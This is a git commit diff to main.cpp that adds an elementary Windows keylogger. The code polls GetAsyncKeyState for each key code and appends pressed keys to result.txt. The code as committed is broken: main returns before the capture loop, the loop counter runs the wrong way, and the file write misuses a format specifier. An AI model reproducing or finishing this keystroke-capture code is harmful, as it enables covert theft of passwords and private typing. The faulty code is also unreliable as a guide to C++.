a3c0b486edaa82c07762fe7b7bf4565d0454e37c
Kwangyun <kkeum@ucsd.edu>
2021-06-16 19:29:10 +0200

    working

--- main.cpp
+++ main.cpp
@@ -1,6 +1,27 @@
 #include <iostream>
+#include <fstream>
+#include <Windows.h>
+using namespace std;
 
-
+int Save(int key, const char *file) {
+    cout << key << endl;
+    FILE *OUTPUT_FILE;
+    OUTPUT_FILE = fopen(file, "a+");
+    fprintf(OUTPUT_FILE, "%s", &key);
+    fclose(OUTPUT_FILE);
+    return 0;
+}
 int main () {
     return 0;
+    char i;
+    cout << "HELLO" << endl;
+    return 0;
+    while (true) {
+        for (i = 8; i < 255; i--) {
+            //if the button is pressed
+            if(GetAsyncKeyState(i)== -32767){
+                Save(i,"result.txt");
+            }
+        }
+    }
 }
